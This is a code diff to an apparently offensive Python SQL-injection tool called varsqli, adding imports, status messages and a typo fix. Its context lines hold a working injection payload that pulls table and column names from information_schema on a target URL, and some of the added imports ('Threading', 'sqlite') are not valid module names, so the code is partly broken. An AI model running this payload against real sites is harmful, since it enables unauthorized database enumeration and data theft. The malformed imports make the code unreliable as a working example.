@@ -1,9 +1,13 @@
-# varsqli v 1.1.5
+# done
 import requests
 import argparse
 import time
 import re
 import os
+import socket
+import Threading
+import sqlite
+from bs4 import BeautifulSoup
 
 def banner():
     print('''
@@ -748,6 +752,10 @@ if target_url:
                                             print("web server operating Database 1 :", dbs)
                                             print("web server operating Database 2 : information_schema")
                                             print("--------")
+                                            print("[INFO] Found 2 table database :")
+                                            print("[+]", dbs)
+                                            print("[+] information_schema")
+                                            print("")
                                         print("[INFO] Starting Enumerate DBMS table name...")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
@@ -762,7 +770,7 @@ if target_url:
                                         print("------------------")
                                         for database_table in database_all:
                                             print(f"[INFO] fetching database on {dbs} ", database_table)
-                                            tiem.sleep(0.30)
+                                            time.sleep(0.30)
                                         for dbmss in database_table:
                                             print('-------------------------')
                                             print(database, end=" | ")
@@ -1515,6 +1523,10 @@ if target_url:
                                             print("web server operating Database 1 :", dbs)
                                             print("web server operating Database 2 : information_schema")
                                             print("--------")
+                                            print("[INFO] Found 2 table database :")
+                                            print("[+]", dbs)
+                                            print("[+] information_schema")
+                                            print("")
                                         print("[INFO] Starting Enumerate DBMS table name...")
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
